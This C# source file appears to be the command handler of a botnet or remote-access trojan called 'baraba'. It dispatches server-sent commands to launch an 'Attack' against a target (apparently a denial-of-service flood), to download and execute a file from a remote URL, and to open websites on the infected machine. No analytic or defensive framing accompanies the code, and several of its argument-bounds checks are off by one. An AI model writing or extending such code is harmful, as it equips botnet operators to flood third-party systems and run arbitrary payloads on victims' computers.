using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace baraba.Commands
{
    class Command
    {
        /// <summary>
        /// Execute Command From Server.
        /// </summary>
        public static void Perform(string Command, string[] Args)
        {
            // If Command is not empty.
            if (Command != String.Empty)
            {
                switch (Command.ToLower())
                {
                    // Attack:
                    case "0":
                        if ((Args.Count() >= 4))
                            Attack.Setup(Args[0], Args[1], Convert.ToInt32(Args[2]),
                                                           Convert.ToInt32(Args[3]),
                                                           Convert.ToInt32(Args[4]));
                        break;
                    // Download And Execute.
                    case "1":
                        if ((Args.Count() >= 0))
                            DownloadAndExecute.Perform(Args[0]);
                        break;
                    // Open Website.
                    case "2":
                        if (Args.Count() >= 1)
                        {
                            bool mode = false;
                            if ((Args[0] == "1"))
                                mode = true;
                            OpenWebsite.Perform(mode, Args[1]);
                        }
                        break;
                }
            }
        }
    }
}
